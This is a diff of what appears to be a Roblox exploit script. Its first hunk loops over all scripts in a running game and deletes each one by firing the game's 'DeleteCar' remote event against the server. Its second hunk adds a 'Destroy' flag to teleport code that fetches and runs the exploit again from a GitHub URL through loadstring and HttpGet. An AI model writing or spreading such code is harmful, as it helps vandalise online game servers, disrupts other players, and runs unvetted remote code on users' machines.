@@ -36,7 +36,7 @@ if Destroy then
     for _,v in pairs(game:GetDescendants()) do
         if v:IsA("Script") or v:IsA("LocalScript") then
             if index % 73 == 0 then wait(0.01) end   
-            game:GetService("ReplicatedStorage").DeleteCar:FireServer(v) 
+            Del(v) 
             index = index + 1
         end  
     end
@@ -69,6 +69,7 @@ game:GetService("Players").LocalPlayer.OnTeleport:Connect(function(State)
       Global.CK4 = ]]..tostring(Global.CK4)..[[
       Global.Chat = ]]..tostring(Global.Chat)..[[
       Global.Enabled = ]]..tostring(Global.Enabled)..[[
+      Global.Destory = ]]..tostring(Global.Destroy)..[[
       loadstring(game:HttpGet("https://raw.githubusercontent.com/Error-Cezar/Roblox-Scripts/main/TCH-Fucker.lua"))()]])
   end
 end)
